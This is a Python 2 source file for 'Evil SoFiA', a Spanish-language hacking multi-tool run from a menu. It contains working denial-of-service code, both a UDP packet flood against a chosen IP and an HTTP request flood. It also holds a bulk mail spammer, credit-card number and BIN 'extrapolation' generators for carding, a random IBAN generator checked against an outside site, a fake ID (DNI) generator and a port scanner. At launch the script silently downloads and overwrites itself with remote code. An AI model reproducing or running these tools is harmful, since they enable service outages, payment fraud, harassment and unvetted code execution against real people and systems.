#Evil SoFiA 
import re
import time 
from random import choice
import os
import sys
import json

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


vrs = ('mOS VERSION\n')
time.sleep(0.5)

try:
 import requests
except:
  print(" Installing requests Module")
  if os.name=='nt':
    try:
      os.system('C:\Python27\Scripts\pip2.exe install requests')
    except:
      print ("Install Python-Pip Sir")
      raw_input('')
  else:
    os.system('pip2 install requests')
msg001 = ("""
                                     _       
                                    | |      
  ___ __ _ _ __ __ _  __ _ _ __   __| | ___  
 / __/ _` | '__/ _` |/ _` | '_ \ / _` |/ _ \ 
| (_| (_| | | | (_| | (_| | | | | (_| | (_) |
 \___\__,_|_|  \__, |\__,_|_| |_|\__,_|\___/ 
                __/ |                        
               |___/                         
""")


resp = requests.get("https://api.ipify.org?format=json")
js = resp.json()
ip = js['ip']

onde = requests.get("https://ip.teoh.io/api/vpn/"+ip)

skri = onde.json()

esono = skri['vpn_or_proxy']

if esono=="no":
  pass
elif esono=="yes":
  print("[PROXY DETECTED]")
else:
  print("error")

print(msg001)
msg00 = "OOO\n"
for i in msg00:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.5)

vers=requests.get('https://pastebin.com/raw/0pqX38U3').text.encode('utf-8')

if vers=="6.0.2":
    pass
else:
  codigonuevo = requests.get("https://raw.githubusercontent.com/emiliobog/Evil-Sofia/master/Sofia.py").text
  f = open("Sofia.py", "wb")
  f.write(codigonuevo)
  print("UPDATE SUCCESSFULLY")

ax = os.system
cls()

ols = time.strftime("%H:%M:%S")
print time.strftime("                    %I:%M:%S") 
if ols > "23:30":
    print ("EVIL SOFIA ESTA REFRESCANDO!...")
    print("CODIFICADO EN: ")
    print ('''
                _
        ,--(_)         @               @
      _/ ;-. \    @  @ @,m. @  @ ,mm. m@m  @  @
     (_)(   )-)   @  @ @  8 @  @ @  @  @   @  @
       \ ;-'_/    `""' `""' `""' "  "  `"" `""'
 -BOG-  `--(_)
''')

    exit()
else:
    print (" ")


print("    ___ _   _  _ _      __   __  ___ _  __   ")
print("   | __| \ / || | |   /' _/ /__\| __| |/  \  ")
print("   | _|`\ V /'| | |_  `._`.| \/ | _|| | /\ | ")
print("   |___| \_/  |_|___| |___/ \__/|_| |_|_||_|  ")

time.sleep(1.4)
#ax("title EVIL SOFIA")
print ("         Emmanuel Milos" + "|" + "Emilio Barroso")
print ("              ~MULTI-HERRAMIENTA~")
print ('''
  
''')

while True:
    print("      .:MENU:.")
    print("   1.EXTRAPOLADOR")
    print("   2.GENERADOR DE DNI")
    print("   3.ATAQUE DDOS")
    print("   4.IBAN GEN/CHECK")
    print("   5.ENCRIPTADOR")
    print("   6.EXTRAPOLADOR V2 [BETA]")
    print("   7.MAIL SPAMMER")
    print("   8.HOST TO IP")
    print("   9.STEAD - DDOS")
    print("   10.CCGEN")
    print("   11.PORT SCANNER ")
    print("   12.PROXY CHECKER ")
    print("   99.Salir")
    print("")
    opc = input("  Digite el numero de la opcion: ")


    if opc == 1:
        Bin = int(input("Digite los primeros 8 digitos del Bin: "))
        lista = []
        Intro = lista.append(Bin)

        #Primer Bin
        bin11 = int(input("Introduce el digito numero DIEZ del primer Bin: "))
        if bin11 >= 0 and bin11 <= 9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin11 = int(input("Vuelve a introducir el digito: "))

        bin12 = int(input("Introduce el digito numero ONCE del primer Bin: "))
        if bin12 >= 0 and bin12 <= 9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin12 = int(input("Introduce el digito numero ONCE del primer Bin: "))

        #Segundo Bin

        bin21 = int(input("Introduce el digito numero DIEZ del segundo Bin: "))
        if bin21 >= 0 and bin21 <=9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin21 = int(input("Vuelve a introducir el digito: "))

        bin22 = int(input("Introduce el digito numero ONCE del segundo Bin: "))
        if bin22 >= 0 and bin22 <=9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin22 = int(input("Introduce el digiro numero ONCE del segundo Bin: "))

        #Algoritmo

        A = int(bin11 + bin21 / 2) * 5
        B = int(bin12 + bin22 / 2) * 5
        C = A + B

        #Agregar los digitos

        Intro2 = lista.append(C)
        print("Tu extrapolacion es: ")
        time.sleep(0.8)
        print("".join(repr(e) for e in lista))
        print("")
        time.sleep(2)

    elif opc==2:
        #LAST DNI GEN
        import time
        
        from random import randint
        
        cls()
        
        print time.strftime("               %I:%M:%S")
        print('''
    
$$\        $$$$$$+   $$$$$$\ $$$$$$$$\ 
$$ |      $$  __$$\ $$  __$$\\__$$  __|
$$ |      $$ /  $$ |$$ /  \__|  $$ |   
$$ |      $$$$$$$$ |\$$$$$$\    $$ |   
$$ |      $$  __$$ | \____$$\   $$ |   
$$ |      $$ |  $$ |$$\   $$ |  $$ |   
$$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |   
\________|\__|  \__| \______/   \__|   
                                       
                                                                 
            ''')
        dni=range(1,9)
        print("   Emmanuel Milos|Emilio Barroso")

        i=0

        while i<len(dni):
            for elento in dni:
               dni[i]=randint(1,9)
            i+=1


    
        dni2=x=''.join(map(str,dni))

        print ' '
        time.sleep(2)
        print ("          Generando DNI...")
        time.sleep(3)
        print '''
        '''
        def ra():
            numero = dni2

            intnumero = int(numero)

            letra1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

            resto = intnumero%23

            letra = letra1[resto]
            print ('   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%')
            print '   %        ' + numero,  "-", letra + '       %'
            print('   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%')
            print (" ")

        ra()

        raw_input("Presiona Enter Para Salir De El Gen")
        
    elif opc==3: 
        import socket
        import random
        from datetime import datetime
        now = datetime.now()
        hour = now.hour
        minute = now.minute
        day = now.day
        month = now.month
        year = now.year

        ##############
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        #############

        cls()
        print ('''
 _  _  _  __    _ ______ _  __   
| \| \/ \(_    |_| |  | |_|/  |/ 
|_/|_/\_/__)   | | |  | | |\__|\ 
                                                              
        ''')
        ip = raw_input("IP Target : ")
        port = input("Port       : ")

        cls()
        os.system("echo INICIANDO ATAQUE! ")
        
        limonja= ("[====================] 100%")
        for i in limonja:
            sys.stdout.write(i)
            sys.stdout.flush()
            time.sleep(0.2)
        time.sleep(2)
        sent=0
        while True:
             sock.sendto(bytes, (ip,port))
             sent = sent + 1
             port = port + 1
             print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
             if port == 65534:
                port = 1
                break;
    elif opc==4:
        from random import *
        import random
        import time
        import requests
        import string
        import thread

        logs1 = '''
         ___ ____    _    _   _        ____ _____ _   _ 
        |_ _| __ )  / \  | \ | |      / ___| ____| \ | |
        || ||  _ \ / _ \ |  \| |_____| |  _|  _| |  \| |
        || || |_) / ___ \| |\  |_____| |_| | |___| |\  |
        |___|____/_/   \_\_| \_|      \____|_____|_| \_|                                               
        [$] BOG IBAN GEN/VALIDATOR.
        [$] https://www.Bogpro.com/
        '''

        print (logs1)
        print '[X] ESCOGE EL PAIS [GERMANY[DE]/FRANCE[FR]/SPAIN[ES]/ITALIA[IT]].'
        print ''

        iban_co = raw_input('[X] ENTER YOUR IBAN COUNTRY NAME OR CODE X> ')
        if str(iban_co) == 'DE' or str(iban_co) == 'GERMANY':
            # //DE IBAN
            def de_chk(a, ab):
                de_iban = 'DE'+str(random.randint(00,99))+'50010517'+str(random.randint(0000000000,9999999999))
                chk_req = requests.post('https://check-iban.com/proxy.php?iban='+de_iban)
                if 'Diese IBAN ist nicht korrekt.' in chk_req.content:
                    print'[-] INVALID GERMANY IBAN [ '+de_iban+' ]'
                    pass
                elif 'Diese IBAN ist formal korrekt.' in chk_req.content:
                    print '[+] VALID GERMANY IBAN [ '+de_iban+' ].'
                    with open('VALID_DE.txt','a+') as f:
                        f.write('[+] VALID GERMANY IBAN [ '+de_iban+' ].')
                        f.close()
                else:
                    print '[%] UNKNOWN GERMANY IBAN [ '+de_iban+' ].'
            while 1:
                thread.start_new_thread(de_chk, ('logs1', 10))
                time.sleep(0.25)

        elif str(iban_co) == 'FR' or str(iban_co) == 'FRANCE':
            # //FR IBAN
            def fr_chk(a, ab):
                fr_iban = 'FR'+str(random.randint(00,99))+'30066'+str(random.randint(000000000000000000,999999999999999999))
                chk_req = requests.post('https://check-iban.com/proxy.php?iban='+fr_iban)
                if 'This is a valid IBAN.' in chk_req.content:
                    print '[-] INVALID FRANCE IBAN [ '+fr_iban+' ].'
                    pass
                else:
                    print '[+] VALID FRANCE IBAN [ '+fr_iban+' ].'
                    with open('VALID_FR.txt','a+') as f:
                        f.write('[+] VALID FRANCE IBAN [ '+fr_iban+' ].')
                        f.close()
            while 1:
                thread.start_new_thread(fr_chk, ('logs1', 10))
                time.sleep(0.25)

        elif str(iban_co) == 'ES' or str(iban_co) == 'SPAIN':
            # //ES IBAN
            def es_chk(a, ab):
                es_iban = 'ES'+str(random.randint(0000000000000000000000,9999999999999999999999))
                chk_req = requests.post('https://check-iban.com/proxy.php?iban='+es_iban)
                if 'This is a valid IBAN.' in chk_req.content:
                    print '[+] VALID SPAIN IBAN [ '+es_iban+' ].'
                    with open('VALID_ES.txt','a+') as f:
                        f.write('[+] VALID SPAIN IBAN [ '+es_iban+' ].')
                        f.close()
                else:
                    print '[-] INVALID SPAIN IBAN [ '+es_iban+' ].'
                    pass
            while 1:
                thread.start_new_thread(es_chk, ('logs1', 10))
                time.sleep(0.25)

        elif str(iban_co) == 'IT' or str(iban_co) == 'ITALY':
            # //IT IBAN
            def it_chk(a, ab):
                it_iban = 'IT'+str(random.randint(00,99))+''.join(random.choice(string.ascii_uppercase) for _ in range(1))+'0300203280'+str(random.randint(000000000000,999999999999))
                chk_req = requests.post('https://check-iban.com/proxy.php?iban='+it_iban)
                if 'This is a valid IBAN.' in chk_req.content:
                    print '[-] VALID ITALY IBAN [ '+it_iban+' ].'
                    with open('VALID_IT.txt','a+') as f:
                        f.write('[+] VALID ITALY IBAN [ '+it_iban+' ].')
                        f.close()
                else:
                    print '[+] INVALID ITALY IBAN [ '+it_iban+' ].'
                    pass
            while 1:
                thread.start_new_thread(it_chk, ('logs1', 10))
                time.sleep(0.25)    
        else:
            # //OUT PUT
            print '[*]  PORFAVOR ESCRIBE UN PAIS O CODIGO DE PAIS VALIDO.'
    elif opc==5:
        cls()
        print ('   OTRAS HERRMAIENTAS')
        print ('      <<_MENU_>>')
        print("")
        print ('11 - ENCRIPTADOR DE PALABRAS')
        time.sleep(5)

        othert = int(input("DIGITE LA OPCION: "))
        if othert == 11:
            print ("BOG SECURITY")
            print("")
            texto =  "hola "
            opcion= 0
            opcion = int(raw_input("ecriptar= 1 , desencriptar= 2: ") )
            abc= ['!','a','b','c','d','e','f','g','h','i','j','k','l','m','n','#','o','p','q','r','s','t','u','v','w','x','y','z','-','&','@','.',';','0','1','2','3','4','5','6','7','8','9','|'] #45
            rpas =len(abc) 

            def invertir(var):
                    return var[::-1]
 
#funcion de resta
            def restar(x,y):
                    if x>y:
                        return x-y
                    else:
                        return y-x
 
            #funcion para eliminar los espacios
            def sin(txt):
                    nuevo=""
                    for x in txt:
                            if x=='|':
                                nuevo = nuevo+' '
                            else:
                                nuevo = nuevo+x
                    return nuevo
 
            def espacio(texto):
                    espacios= ""
                    for x in texto:
                            if x==' ':
                                espacios = espacios+'|'
                            else:
                                espacios = espacios+x.lower() #convertimos a minusculas 
                    return espacios
 
 #opcion de encriptacion
            if opcion == 1:
                print"opcion de encriptacion"
                mensaje=""
                clave =""
 
                mensaje = raw_input("introduzca mensaje a ecriptar: ")
                clave = raw_input("introduzca palabra clave: ")
                n =   len(mensaje)  #cuento la cantidad de caracteres 
                posicion= 0
                ab=clave[0]
                index = abc.index(ab)
                encoding= ""
                suma = 0
                espacios=""
                espacios=espacio(mensaje)
 
                for x in espacios:
                    for y in range(rpas):
                        li = 0
                        if x==abc[y]:
                                li=y+index
                                if li <= rpas:
                                    encoding =encoding+abc[li]
 
                                else:
                                    suma= restar(rpas,li)
                                    encoding =encoding+abc[suma]+'$'
                                    suma = 0
    #print encoding
                print "mensaje cifrado: ",invertir(encoding)
                print "su clave es:", clave
                time.sleep(10)
                cls()
            if opcion == 2:
 
                print"opcion de desencriptacion"
                mensaje=""
                mensaje= ''
                mensaje = raw_input("Introduzca mensaje Encriptado: ")
                clave = raw_input("Introduzca clave: ")
                ab=clave[0] #seleccionamos la letra de la posicion 0 
                index = abc.index(ab)  #usamos nuestra letra la ver en donde cae en la lista de abc
 
                contador = 0
                decoding= ''
                letra= ''
                tx= ''
                suma = 0
                rango =   len(mensaje) #cuento la cantidad de caracteres
 
                w=0
                while w < rango:
                        letra=mensaje[w]
                        if letra =='$':    
                                incr = w+1
                                li = 0
                                tx=mensaje[incr]
                                posicion= w
                                for y in range(rpas):
                                    if tx == abc[y]:
                                        li=restar(index,y)
                            #print index, " - ", y,"=",li
                                        suma=restar(rpas,li)
                                    decoding =decoding+abc[suma]
                                    w+=1
                        else:
                                li = 0
                                tx=mensaje[w]
                                posicion= w
                                for s in range(rpas):
                                    if tx == abc[s]:
                                        li= restar(s,index)
                                        decoding =decoding+abc[li]
                            #print posicion
                        w+=1
                #print decoding
                mensaje =invertir(decoding)
                #print mensaje
                print "mensaje abierto: ",sin(mensaje)
        else:
            print("otsion no valida krnal")
    elif opc==6:
        Bin = int(input("Digite los primeros 8 digitos del Bin: "))
        lista = []
        Intro = lista.append(Bin)

        #Primer Bin
        bin11 = int(input("Introduce el digito numero DIEZ del primer Bin: "))
        if bin11 >= 0 and bin11 <= 9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin11 = int(input("Vuelve a introducir el digito: "))

        bin12 = int(input("Introduce el digito numero ONCE del primer Bin: "))
        if bin12 >= 0 and bin12 <= 9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin12 = int(input("Introduce el digito numero ONCE del primer Bin: "))

        #Segundo Bin

        bin21 = int(input("Introduce el digito numero DIEZ del segundo Bin: "))
        if bin21 >= 0 and bin21 <=9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin21 = int(input("Vuelve a introducir el digito: "))

        bin22 = int(input("Introduce el digito numero ONCE del segundo Bin: "))
        if bin22 >= 0 and bin22 <=9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin22 = int(input("Introduce el digiro numero ONCE del segundo Bin: "))

        A = int(bin11 + bin21 / 2) * 5
        B = int(bin12 + bin22 / 2) * 5
        C = A + B
        D = (C/2)*(A+B)
        Intro2 = lista.append(D)
        print("Tu extrapolacion es: ")
        time.sleep(0.8)
        print("".join(repr(e) for e in lista))
        print("")
        time.sleep(2)
    elif opc==7:
        import smtplib
        import time
        import random
        import os, sys, smtplib, getpass
        def logo():
                cls()
                print '''
             o
             X
             X
        |===[O]===|
            |||
            |||
            |||
            |||
            |||
            |||
            |||
            |||
            |||
            |^|
            \ /
             `
        '''
        logo()
        print "        <_*PROTON*_>"
        print ""


        try:

            W = ""
            R = ""
            G = ""




            server = raw_input ('Mail-Server Gmail/Yahoo: ')

            if server == 'gmail' or server == 'Gmail':

                smtp_server = 'smtp.gmail.com'
                port = 587
                set_server = "gmail"

            elif server == 'yahoo' or server == 'Yahoo':

                smtp_server = 'smtp.mail.yahoo.com'
                port = 25
                set_server = "yahoo"

            else:

                print(R + "Error - El Script Solo Funciona Con gmail o yahoo" + W)
                sys.exit()

            email_user = raw_input('Email: ')
            passwd     = getpass.getpass('Password: ')
            email_to   = raw_input('\nPARA: ')
            subject    = raw_input('ASUNTO: ')
            body       = raw_input('MENSAJE: ')
            total      = input('NUMERO DE MENSAJES A ENVIAR: ')

            try:

                server = smtplib.SMTP(smtp_server,port) 
                server.ehlo()

                if set_server == "gmail":
                    server.starttls()

                server.login(email_user,passwd)

                print("\n\n\n - Objetivo : {} -\n".format(email_to))

                for i in range(1, total+1):

                    msg = 'DE: ' + email_user + '\nASUNTO: ' + subject + '\n' + body + '\n' +  "#Evil_SOFIA - HACKING SOFTWARE"

                    server.sendmail(email_user,email_to,msg)

                    print(G + "<======[" + "Email enviado - {}".format(i) + "]======>")

                    sys.stdout.flush()

                server.quit()

                print( R + "\n\n-Proceso Terminado-" + W)


            except KeyboardInterrupt:

                print(R + "\nError - Teclado Interrumpido" + W)
                sys.exit()

            except smtplib.SMTPAuthenticationError:

                print( R + "\nError - Error de autenticacion, Esta seguro de que la contrasena o el nombre de usuario son correctos?" + W)
                sys.exit()

        except smtplib.SMTPAuthenticationError:

            sys.exit()
    elif opc==8:
        from socket import gethostbyname

        def BOG():
            print'\a=[Welcome to Ip Scanner by: BINERS OF GLORY]='
            target = raw_input('Enter the Host: ')
            targetIP = gethostbyname(target)
            print '\a-Target IP ===>', targetIP
            print '+------------------------------------+'
            #BOG()
        BOG()
    elif opc==9:
        botella = 0 
        print '''
 SSS  TTTTTT EEEE  AA  DDD  
S       TT   E    A  A D  D 
 SSS    TT   EEE  AAAA D  D 
    S   TT   E    A  A D  D 
SSSS    TT   EEEE A  A DDD'''
        try:
            import requests
        except:
            print"Installing requests Module"
            if os.name=='nt':
                try:
                    os.system('C:\Python27\Scripts\pip2.exe install requests')
                except:
                    print "Install Python-Pip Sir"
                    raw_input('')
                else:
                    os.system('pip2 install requests')

        import requests
        inpu = raw_input("URL A ATACAR: ")
        def function():
            vers=requests.get(inpu).text.encode('utf-8')
            if vers=="meisecaca" :
                print('EL SERVER TIENE PROTECCION CONTRA ESTE DDOS') 
            else:
                print("PAQUETE ENVIADO CORRECTAMENTE")
               
                print(botella)
                function()
        function()
    elif opc==10:
        from random import *
        from time import sleep
        ayuda =(choice(["1","2","3","4","5","6","7","8","9","0"]))
        ayudaa =(choice(["1","2","3","4","5","6","7","8","9","0"]))
        ayudaaa =(choice(["1","2","3","4","5","6","7","8","9","0"]))
        mes = (choice(["1","2","3","4","5","6","7","8","9","10","11","12"]))
        anoxd = (choice(["20","21","22","23","24","25","26","27","28","29","30"]))
        ostia = (ayuda + ayudaa + ayudaaa)
        otsu = ("|"+mes+"|"+anoxd+"|"+ostia)    
        otsu1 = ("|"+mes+"|"+anoxd+"|"+ostia)
        bin = str(input("Digite Su bin: "))
        prefix = []
        intro = prefix.append(bin)
        valid = prefix[randint(0, len(prefix)-1)]

        newcard = map(int, str(valid))

        for i in range(9):
            newcard.append(randint(0,9))

        gen = list(newcard)
        gen.reverse()
        for i, x in zip(range(len(gen)), gen):
            if i % 2 == 0:
                dub = x * 2
                dub = dub / 10 + dub % 10
                gen[i] = dub

        check = sum(gen) * 9 % 10
        newcard.append(check)

        output = map(str, newcard)
        print "".join(output) +(otsu)
    elif opc==11:
        import socket
        import subprocess
        import sys
        from datetime import datetime
        print("PORT SCANNER V-0.1 - BETA")
        subprocess.call('clear', shell=True)

        remoteServer    = raw_input("HOST A ESCANEAR: : ")
        remoteServerIP  = socket.gethostbyname(remoteServer)
        print "-" * 60
        print "ESPERA, ESCANEANDO HOST REMOTO: ", remoteServerIP
        print "-" * 60


        t1 = datetime.now()
        try:
            for port in range(1,1025):  
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((remoteServerIP, port))
                if result == 0:
                    print "Port {}:    Open".format(port)
                sock.close()

        except KeyboardInterrupt:
            print "INTERRUMPIDO"
            sys.exit()

        except socket.gaierror:
            print 'Hostname could not be resolved. Exiting'
            sys.exit()

        except socket.error:
            print "Couldn't connect to server"
            sys.exit()
        t2 = datetime.now()
        total =  t2 - t1
        print 'Scanning Completed in: ', total
    elif opc==12:
        import socket
        cls()
        isla=0
        saca=2

        poseidon = '''
   ___  ____  _______________  ____  _  __
  / _ \/ __ \/ __/ __/  _/ _ \/ __ \/ |/ /
 / ___/ /_/ /\ \/ _/_/ // // / /_/ /    /
/_/   \____/___/___/___/____/\____/_/|_/

Proxy Checker [IP:PORT]
        '''
        print(poseidon)

        while True:
          propsi = raw_input("Proxy: ")
          try:
              hostname = propsi.split(':')[0]
              porto = propsi.split(':')[1]
              socket.gethostbyaddr(hostname)
              isla+=1
              if saca==2:
                break;
              else:
                pass
          except socket.herror:
              print ("[X] [Proxy Die] => " + hostname + ":" + porto)
              isla+=2
              break;
        if isla==1:
          print("[+] [Proxy Live] => " + hostname + ":" + porto)
          saca+=2


        
    elif opc==99:
        pris = "Gracias Por Utlizar Evil_SOFIA.  VERSION:" + vrs 
        for i in pris:
         sys.stdout.write(i)
         sys.stdout.flush()
         time.sleep(0.02)
        break
        exit()
